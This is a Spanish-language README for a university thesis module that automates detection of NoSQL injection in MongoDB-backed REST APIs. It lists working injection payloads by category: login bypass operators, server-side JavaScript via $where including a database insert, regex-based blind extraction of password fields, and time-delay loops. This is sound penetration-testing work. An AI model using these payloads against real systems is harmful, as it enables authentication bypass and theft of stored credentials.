# Módulo de Detección de NoSQL Injection (nosql-detection-module)

## Descripción General

Este repositorio forma parte del proyecto de titulación titulado _"Desarrollo de una herramienta para pruebas de penetración en aplicaciones móviles Android"_, desarrollado en la Facultad de Ingeniería de Sistemas de la Escuela Politécnica Nacional (EPN). El módulo está enfocado en la automatización de la identificación, análisis y explotación controlada de vulnerabilidades por Inyección NoSQL (NoSQLi) en APIs REST.

---

## Arquitectura y Flujo del Módulo

![Diagrama de Arquitectura del Módulo NoSQLi](docs/images/arquitectura_nosql.png)

_El diagrama superior detalla el flujo operativo: el interceptor extrae los parámetros de la solicitud HTTP, el motor aplica los vectores estructurados de operadores BSON y el sistema analiza la respuesta del servidor para determinar la vulnerabilidad._

---

## Motor de Base de Datos

- **Motor seleccionado:** MongoDB.
- Se seleccion&oacute; MongoDB debido a su posici&oacute;n dominante como el sistema de gesti&oacute;n de bases de datos NoSQL orientado a documentos (_Document Stores_) más utilizado a nivel global.

![Ranking General de Popularidad - DB-Engines](docs/images/db_engines_ranking.png)
*Figura: Posicionamiento general en el ranking de DB-Engines, reflejando la alta adopción de MongoDB en la industria frente a otros motores relacionales y no relacionales.*


![Tendencia Histórica de Popularidad - DB-Engines](docs/images/db_engines_trend.png)
_Ilustraci&oacute;n n: Gráfica de tendencia histórica de popularidad (escala logarítmica) obtenida de [DB-Engines Ranking of Document Stores](https://db-engines.com/en/ranking_trend/document+store). <br>Las ilustraciones evidencian el liderazgo de MongoDB frente a otras alternativas del mercado a lo largo del tiempo, conviertendo al motor en el objetivo ideal para el análisis de vulnerabilidades NoSQLi en aplicaciones móviles._

---

## Taxonomía y Diccionario de Vectores de Prueba

El motor gestiona y evalúa los vectores de ataque estructurados a partir de repositorios de referencia como *SecLists* y *PayloadsAllTheThings*, organizándose en las siguientes categorías y combinaciones:

### Categoría A: Manipulación Lógica y Bypasses de Autenticación
Explotan la evaluación de operadores de comparación y desigualdad para alterar la condición lógica de las consultas en formularios y validaciones:
* **Operadores de desigualdad ($ne, $nin):** Fuerza la condición a verdadero buscando elementos que no coincidan con un valor dummy.
  * `{ $ne: 1 }`
  * `[$ne]=1`
  * `{$nin: [""]}`
* **Operadores de rango y mayor que ($gt):** Seleccionan cualquier registro cuyo valor sea mayor a vacío o nulo.
  * `{$gt: ''}`
  * `{"$gt": ""}`
* **Estructuras múltiples y arrays lógicos:**
  * `', $or: [ {}, { 'a':'a' } ] }`
  * `} ],$comment:'successful MongoDB injection'`

### Categoría B: Ejecución de Código en el Servidor ($where)
Permiten inyectar expresiones de JavaScript directamente en el motor para evaluar condiciones del lado del servidor:
* Sentencias de evaluación directa:
  * `true, $where: '1 == 1'`
  * `, $where: '1 == 1'`
  * `$where: '1 == 1'`
  * `', $where: '1 == 1'`
  * `1, $where: '1 == 1'`
* Inyecciones con lógica de retorno e inserción:
  * `'; return 'a'=='a' && ''=='';`
  * `db.injection.insert({success:1});`
  * `db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { emit(1,1 || 1==1`
  * `'' || 'a'=='a'`

### Categoría C: Extracción Ciega mediante Expresiones Regulares ($regex)
Utilizadas cuando no existe un retorno directo de errores o datos en la interfaz, permitiendo exfiltrar información carácter por carácter:
* Validación mediante patrones de coincidencia (`match`):
  * `' && this.password.match(/.*/)//+%00`
  * `' && this.passwordzz.match(/.*/)//+%00`
* Variantes de codificación y bypass de sintaxis:
  * `%20%26%26%26this.password.match(/.*/)//+%00`
  * `%20%26%26%26this.passwordzz.match(/.*/)//+%00`

### Categoría D: Pruebas de Retardo y Validación de Atributos (Time-Based / Blind)
Diseñadas para escenarios donde la respuesta de la aplicación depende de tiempos de espera o de la existencia de atributos específicos en colecciones BSON:
* Retardos basados en tiempo (sleep / bucles síncronos):
  * `';sleep(5000);`
  * `';it=new Date();do{pt=new Date();}while(pt-it<5000);`
* Verificación de existencia de campos (`$exists`): Vectores orientados a comprobar la presencia o ausencia de llaves específicas dentro de las colecciones BSON.

---

## Evidencias y Pruebas del Prototipo

![Captura de Ejecución del Módulo](docs/images/ejecucion_modulo.png)

_Interfaz de configuración y resultados de la ejecución de payloads contra la API de prueba._

---

## Información del Autor y Componente

- **Estudiante:** Juan Diego Suárez Barberán
- **Componente Asignado:** Módulo de Detección de NoSQL Injection
- **Carrera:** Ingeniería de Software
- **Institución:** Escuela Politécnica Nacional (EPN)
